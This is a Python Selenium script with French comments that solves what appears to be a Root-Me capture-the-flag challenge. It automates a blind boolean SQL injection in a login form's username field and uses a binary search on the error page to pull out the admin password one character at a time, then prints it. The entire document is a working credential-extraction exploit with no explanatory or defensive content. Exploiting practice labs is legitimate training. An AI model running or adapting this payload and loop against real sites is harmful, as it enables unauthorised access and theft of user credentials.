from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Initialiser le WebDriver
driver = webdriver.Chrome()

url = "http://challenge01.root-me.org/realiste/ch12/login.aspx"
password = ""

try:
    driver.get(url)

    for i in range(0, 128):  # Commencez à partir du 3ème caractère
        start = 32  # Caractère ASCII de départ (espace)
        end = 126  # Caractère ASCII de fin (~)
        while start <= end:
            mid = (start + end) // 2
            payload = f"admin' AND (SELECT hex(substr(password, {i + 1}, 1)) from users where username='admin' LIMIT 1) < hex('{chr(mid)}'); /*"

            # Attendre que l'élément soit présent
            login_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "login"))
            )
            password_field = driver.find_element(By.NAME, "password")
            submit_button = driver.find_element(By.XPATH, "//input[@type='submit']")

            # Remplir le formulaire et soumettre
            login_field.clear()
            login_field.send_keys(payload)
            password_field.clear()
            password_field.send_keys("anything")
            submit_button.click()

            # Attendre que la page se charge
            time.sleep(2)

            # Analyser le contenu de la page
            page_source = driver.page_source
            # print(page_source)
            if "Error : no such user" in page_source:
                print
                start = mid + 1
            else:
                end = mid - 1

        password += chr(start)
        print(f"Caractère {i + 1}: {chr(start)}")

    print("Mot de passe complet:", password)

finally:
    driver.quit()
